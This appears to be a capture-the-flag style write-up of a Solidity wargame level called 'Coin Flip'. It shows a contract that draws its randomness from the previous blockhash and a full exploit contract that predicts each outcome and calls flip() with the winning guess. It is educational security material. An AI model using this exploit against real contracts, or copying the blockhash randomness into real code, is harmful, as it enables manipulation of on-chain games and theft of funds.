## 3. Coin Flip

Goal for this exercise is:

- Guess the correct outcome 10 times in a row


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
~~~


I had to change import to:
`import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";`
And started to test the contract in remix editor. 


First note was that function`flip()`did not require `_guess` parameter, so it defaults to false. But it does not help us here.
Second note was that we could use another contract to interact with `flip()` function. 


Plan is to write contract which uses same way to calculate coin flip result and play with winning guess.

<br/>

Here is code for the exploit:
~~~
pragma solidity ^0.6.4;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

contract CoinFlipExploit {
    
    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    address payable coinflipAddress = 0x1234...;
    address payable owner;
    
    constructor() public{
        owner = msg.sender;
    }
    
    receive() external payable {}
    
    // withdraw leftover funds
    function withdrawFunds() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function flipExploit() external returns (bool) {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
    
        (bool success, bytes memory response) = coinflipAddress.call{gas:800000}(abi.encodeWithSignature("flip(bool)", side));
        require(success, "Transfer was not successful.");
        
    }
}
~~~

<br/>

I deployed contract from Remix IDE, funded it with 0.1 ether and called `flipExploit()` function.
